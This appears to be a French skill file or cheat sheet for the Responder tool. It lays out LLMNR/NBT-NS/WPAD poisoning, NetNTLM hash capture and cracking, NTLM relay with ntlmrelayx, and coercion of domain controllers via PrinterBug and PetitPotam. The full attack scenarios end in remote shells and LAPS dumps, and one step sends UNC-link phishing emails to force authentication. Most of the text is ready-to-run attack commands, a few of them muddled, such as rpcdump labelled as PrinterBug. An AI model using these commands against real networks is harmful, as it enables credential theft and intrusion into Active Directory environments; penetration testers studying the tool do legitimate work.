---
name: responder
description: Responder — LLMNR/NBT-NS/mDNS poisoner, capture de hash NetNTLMv1/v2, MultiRelay, SMB auth coercion, WPAD rogue, et attaques de relais NTLM dans Active Directory.
---

# Responder — LLMNR/NBT-NS/mDNS Poisoning

## Présentation

Responder est un outil de poisoning de résolution de noms. Il empoisonne LLMNR, NBT-NS et mDNS pour capturer les hash NetNTLM des clients Windows.

**Principe :** Quand un Windows ne trouve pas un nom via DNS, il utilise LLMNR (multicast) puis NBT-NS (broadcast). Responder répond à TOUTES ces requêtes, forçant le client à s'authentifier avec son hash NetNTLM.

**Installation :**
```bash
# Kali (pré-installé)
sudo apt install responder

# Dernière version
git clone https://github.com/lgandx/Responder.git
cd Responder
```

---

## Lancement

### Mode basique
```bash
# Lancer tous les serveurs (par défaut)
sudo responder -I eth0

# Lancer sur une interface spécifique
sudo responder -I wlan0

# Lancer en mode debug (voir tout ce qui se passe)
sudo responder -I eth0 -v
```

### Options de lancement
```bash
# Options courantes
sudo responder -I eth0 -wFb

# -w  : Activer le serveur WPAD (proxy auto-detect)
# -F  : Forcer l'authentification (NTLM via WPAD)
# -b  : Basic auth (HTTP, plus simple mais visible)
# -d  : Activer le serveur DHCP
# -D  : Mode DHCP (pour WPAD)
# -A  : Analyser (ne pas répondre, juste écouter)
# -P  : Mode proxy (ProxyAuth)

# Exemples :
sudo responder -I eth0 -wF        # WPAD + Force + Basic auth
sudo responder -I eth0 -A         # Mode analyse seulement (pas de poisoning)
sudo responder -I eth0 -d -w -F  # DHCP + WPAD + Force
```

---

## Analyse des hashes capturés

### Format de hash
```
# Les hash sont sauvegardés dans /usr/share/responder/logs/
# Chaque hash ressemble à :
[+] SMBv2-NTLMv2 Client  : 192.168.1.100
[+] SMBv2-NTLMv2 Username : DOMAIN\Administrator
[+] SMBv2-NTLMv2 Hash     : Administrator::DOMAIN:1122334455667788:...:...:...

# Format adapté pour John The Ripper
cat /usr/share/responder/logs/SMBv2-NTLMv2-*.txt > hashes.txt
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt

# Format adapté pour Hashcat
sudo cat /usr/share/responder/logs/SMBv2-NTLMv2-*.txt > hashes.txt
hashcat -m 5600 hashes.txt rockyou.txt
```

### Types de hash capturables
```bash
# NetNTLMv1 (moins courant, mais plus faible)
# → hashcat -m 5500
# → crackable en quelques secondes

# NetNTLMv2 (standard)
# → hashcat -m 5600
# → crackable avec wordlist

# NTLMv1-SSP (Extended Security)
# → hashcat -m 5500

# Cleartext (via Basic Auth -b)
# → Mot de passe en clair !
```

---

## Serveurs activés par défaut

### LLMNR (Link-Local Multicast Name Resolution)
```bash
# Port : UDP 5355
# Résolution de noms locale (Windows Vista+)
# Responder écoute et répond aux requêtes LLMNR
# Quand un client cherche "fileserver" et que personne ne répond...
# → Responder répond "Oui c'est moi !" avec son IP
# → Le client s'authentifie avec son hash
```

### NBT-NS (NetBIOS Name Service)
```bash
# Ports : UDP 137-138
# Résolution de nom héritée (Windows NetBIOS)
# Même principe que LLMNR mais plus ancien
```

### mDNS (Multicast DNS)
```bash
# Port : UDP 5353
# Utilisé par macOS et Linux (Avahi/Bonjour)
# Responder répond aussi aux requêtes mDNS
```

### Autres serveurs
```bash
# SMB : TCP 445
#   → Serveur SMB qui capture les hashes NTLM

# HTTP : TCP 80
#   → Serveur HTTP qui capture les credentials

# HTTPS : TCP 443
#   → Serveur HTTPS (certificat auto-signé)

# SQL : TCP 1433
#   → Fake MSSQL server

# FTP : TCP 21
#   → Fake FTP server

# WPAD : TCP 80
#   → Proxy auto-detect (vol de credentials proxy)

# POP3 : TCP 110
#   → Fake mail server

# SMTP : TCP 25
#   → Fake SMTP

# IMAP : TCP 143
#   → Fake IMAP

# LDAP : TCP 389
#   → Fake LDAP
```

---

## WPAD (Web Proxy Auto-Discovery Protocol)

### Activer WPAD
```bash
# Mode complet WPAD
sudo responder -I eth0 -wF

# -w : Serveur WPAD
# -F : Forcer l'authentification NTLM

# Quand un navigateur détecte un proxy WPAD :
# 1. Il cherche wpad.dat sur le réseau
# 2. Responder répond avec son WPAD
# 3. Le navigateur configure le proxy de Responder
# 4. Les requêtes HTTP passent par le proxy
# 5. Responder capture les credentials
```

### Fonctionnement WPAD
```bash
# 1. Le client cherche http://wpad/wpad.dat
# → LLMNR/NBT-NS résout "wpad" vers Responder

# 2. Le navigateur reçoit wpad.dat
# → Définit Responder comme proxy

# 3. Toutes les requêtes HTTP passent par Responder
# → Le proxy répond avec 407 Proxy Auth Required
# → Le client envoie son hash NTLM
# → Hash capturé !

# 4. Si -F est activé :
# → Même les connexions HTTPS forcent l'auth via CONNECT
```

---

## NTLM Relay (MultiRelay)

### Relayer les hashes (au lieu de les cracker)
```bash
# !!! ATTENTION : SMB Signing doit être désactivé sur la cible !!!

# 1. Lancer Responder SANS le serveur SMB
sudo responder -I eth0 -r -d -w -o -v

# -r : Désactiver SMB (important pour le relay)
# -o : Désactiver HTTP (optionnel selon la cible)

# 2. Lancer ntlmrelayx.py (Impacket) dans un autre terminal
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
    -tf targets.txt \
    -smb2support \
    -c "whoami"

# targets.txt :
# 192.168.1.10  # Machine cible (pas SMB signing)
# 192.168.1.20

# 3. Attendre qu'un administrateur tape une commande
# ou utilise un lecteur réseau...
```

### MultiRelay (script additionnel)
```bash
# MultiRelay.py (script supplémentaire dans Responder/tools/)
cd /usr/share/responder/tools/
python3 MultiRelay.py -t 192.168.1.10 -u ALL
```

---

## SMB Auth Coercion

### Forcer l'authentification via des chemins UNC
```bash
# Quand un Windows accède à une ressource :
# 1. Via Microsoft Office (Word, Excel)
#    Ouvrir : \\192.168.1.50\share\document.docx
#    → Le client s'authentifie automatiquement

# 2. Via l'explorateur de fichiers
#    \\192.168.1.50\test

# 3. Via l'invite de commande
#    dir \\192.168.1.50\share

# 4. Via le background de l'écran de veille
#    Configurer l'URL de l'image : \\192.168.1.50\background.jpg
```

### PrinterBug (MS-RPRN) — Forcer une authentification
```bash
# Forcer un contrôleur de domaine à s'authentifier vers Responder
# Via le service d'impression Windows (MS-RPRN)

# 1. Lancer Responder
sudo responder -I eth0

# 2. Lancer PrinterBug (Impacket)
python3 /usr/share/doc/python3-impacket/examples/rpcdump.py \
    @192.168.1.10 | grep MS-RPRN

# 3. Forcer l'authentification
python3 /usr/share/doc/python3-impacket/examples/rpcdump.py \
    192.168.1.10 -port 135

# PrinterBug.py (outil dédié)
python3 printerbug.py DOMAIN/user:password@192.168.1.10 \
    192.168.1.50  # IP de Responder
```

### PetitPotam (MS-EFSRPC)
```bash
# Forcer l'authentification via EFSRPC
# Particulièrement efficace sur les DC Windows

python3 petitpotam.py -u '' -p '' 192.168.1.50 192.168.1.10
# 192.168.1.50 = Responder (attaquant)
# 192.168.1.10 = DC cible

# Alternative avec credentials :
python3 petitpotam.py DOMAIN/user:password@192.168.1.10 \
    192.168.1.50
```

---

## Modification de Responder.conf

### Fichier de configuration (`Responder.conf`)
```bash
# /usr/share/responder/Responder.conf
[Responder Core]

; Serveurs à activer/désactiver
SQL = On
SMB = On
HTTP = On
HTTPS = On
FTP = On
POP = On
SMTP = On
IMAP = On
LDAP = On
DNS = On
NBT-NS = On
LLMNR = On
MDNS = Off

; Serveur WPAD
WPAD = On

; Définition du serveur
Challenge = 1122334455667788  # Challenge fixe (hashcat -m 5600)
```

### Personnalisation
```bash
# Désactiver SMB pour le relay
SMB = Off

# Désactiver HTTP pour éviter les conflits avec d'autres outils
HTTP = Off

# Changer le challenge (pour le cracking)
Challenge = AAAAAAAAAAAAAAAA

# Analyser seulement (pas de réponse)
# Lancer avec -A
```

---

## Analyse des logs

```bash
# Emplacement des logs
ls /usr/share/responder/logs/

# Hashes capturés
cat /usr/share/responder/logs/SMBv2-NTLMv2-*.txt

# Config dump
cat /usr/share/responder/logs/Config-*.txt

# Requêtes LLMNR/NBT-NS analysées
tail -f /usr/share/responder/logs/Responder-Session.log
```

---

## Scénarios complets

### 1. Capture de hash sur network interne
```bash
# 1. Lancer Responder (poisoning passif)
sudo responder -I eth0 -wF -v

# 2. Attendre 10-15 minutes qu'un utilisateur
#    fasse une faute de frappe sur un nom de machine
#    (ex: "printserver" au lieu de "print-srv")

# 3. OU forcer l'authentification :
#    Envoyer un email avec un lien UNC :
#    <img src="\\192.168.1.50\test.jpg">

# 4. Hash capturé ! → Crack avec hashcat
SMB-NTLMv2-HASH:Administrator::DOMAIN:1122...:...:...
# hashcat -m 5600 hash.txt rockyou.txt
```

### 2. Relay NTLM vers un DC (SMB Signing désactivé)
```bash
# Terminal 1 : Responder sans SMB
sudo responder -I eth0 -r -d -w -v

# Terminal 2 : ntlmrelayx
python3 ntlmrelayx.py -tf targets.txt -smb2support \
    -i -I 192.168.1.50

# Terminal 3 : Forcer une connexion (via PrinterBug)
python3 printerbug.py DOMAIN/user@192.168.1.10 192.168.1.50

# Si succès → shell interactif sur 127.0.0.1:11000
ncat 127.0.0.1 11000
```

### 3. Responder + Multirelay
```bash
sudo responder -I eth0 -r -d -w -v
python3 MultiRelay.py -t 192.168.1.10 -u Administrator
```

### 4. PetitPotam vers Responder + Relay
```bash
# Terminal 1 : Responder sans SMB
sudo responder -I eth0 -r -d -w

# Terminal 2 : ntlmrelayx avec dump du SAM
python3 ntlmrelayx.py -t ldap://192.168.1.10 -smb2support \
    --dump-laps

# Terminal 3 : PetitPotam
python3 petitpotam.py -u '' -p '' 192.168.1.50 192.168.1.10
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| Aucun hash capturé | Attendre plus longtemps, forcer via PrinterBug |
| SMB Signing empêche le relay | Crack le hash directement |
| Conflit de port | Modifier Responder.conf ou arrêter les services |
| Ne répond pas | Vérifier -I avec la bonne interface |
| WPAD ne fonctionne pas | Navigateur doit être configuré en "Auto-detect" |

---

## Antisèche rapide

```bash
# Lancer Responder (standard)
sudo responder -I eth0 -wF

# Mode analyse seulement (écouter sans empoisonner)
sudo responder -I eth0 -A

# Capture de hash SMB
# → Attendre une faute de frappe utilisateur
# → OU forcer avec PrinterBug/PetitPotam

# Crack des hashes
# NetNTLMv2 → hashcat -m 5600
# NetNTLMv1 → hashcat -m 5500

# Relay NTLM
# 1. sudo responder -I eth0 -r -d -w
# 2. ntlmrelayx.py -tf targets.txt -smb2support -i

# Forcer l'authentification d'un DC
python3 petitpotam.py -u '' -p '' <IP_ATTAQUANT> <IP_DC>

# Logs
cd /usr/share/responder/logs/
```